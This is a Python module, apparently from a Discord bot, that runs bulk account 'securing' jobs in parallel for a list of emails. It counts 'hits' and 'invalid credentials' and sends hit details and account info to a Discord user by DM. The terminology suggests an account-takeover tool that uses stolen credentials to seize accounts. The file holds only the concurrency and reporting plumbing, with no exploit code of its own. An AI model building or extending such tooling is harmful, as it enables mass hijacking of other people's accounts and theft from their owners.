import asyncio
import logging
from typing import Awaitable, Callable, TypeVar

import discord

from securing.build_embeds import build_failure_embed
from ui.buttons.account_details import accountInfo
from ui.modals.recovery_code import _send_failure_dm

log = logging.getLogger(__name__)

T = TypeVar("T")


async def _secure_one(
    user: discord.User | discord.Member,
    email: str,
    secure_fn: Callable[[], Awaitable[T]],
) -> dict:
    try:
        account = await secure_fn()
    except Exception as e:
        log.exception("recovery_secure crashed for %s during bulk", email)
        fail_embed = build_failure_embed(
            email,
            {},
            "An unexpected error occurred during securing.",
            error=f"{e.__class__.__name__}: {e}",
        )
        await _send_failure_dm(user, fail_embed)
        return {"email": email, "status": "failure", "note": "exception"}

    if isinstance(account, dict) and account.get("failed"):
        await _send_failure_dm(user, account["hit_embed"])
        return {
            "email": email,
            "status": "failure",
            "note": account.get("reason", "failed"),
        }

    if account == "invalid":
        return {"email": email, "status": "failure", "note": "invalid credentials"}

    if not account:
        return {"email": email, "status": "failure", "note": "failed"}

    try:
        view = accountInfo(account["details"]) if account.get("details") else None
        await user.send(embed=account["hit_embed"], view=view)
        return {"email": email, "status": "hit"}
    except discord.Forbidden:
        return {"email": email, "status": "hit", "note": "DMs disabled"}
    except KeyError:
        log.exception("Success result missing expected keys for %s", email)
        await _send_failure_dm(user, account.get("hit_embed"))
        return {"email": email, "status": "failure", "note": "incomplete result"}


async def run_bulk_parallel(
    user: discord.User | discord.Member,
    jobs: list[tuple[str, Callable[[], Awaitable[T]]]],
    *,
    max_concurrent: int | None = None,
) -> tuple[int, int, list[str]]:
    if not jobs:
        return 0, 0, []

    limit = max_concurrent if max_concurrent and max_concurrent > 0 else len(jobs)
    semaphore = asyncio.Semaphore(limit)

    async def _run(email: str, secure_fn: Callable[[], Awaitable[T]]) -> dict:
        async with semaphore:
            return await _secure_one(user, email, secure_fn)

    results = await asyncio.gather(
        *[_run(email, fn) for email, fn in jobs],
        return_exceptions=True,
    )

    hits = 0
    failures = 0
    failed_emails: list[str] = []

    for i, result in enumerate(results):
        email = jobs[i][0]
        if isinstance(result, Exception):
            log.exception("Unhandled bulk task error for %s", email, exc_info=result)
            failures += 1
            failed_emails.append(f"`{email}` (exception)")
            continue

        if result["status"] == "hit":
            hits += 1
            if result.get("note"):
                failed_emails.append(f"`{email}` ({result['note']})")
        else:
            failures += 1
            failed_emails.append(f"`{email}` ({result.get('note', 'failed')})")

    return hits, failures, failed_emails
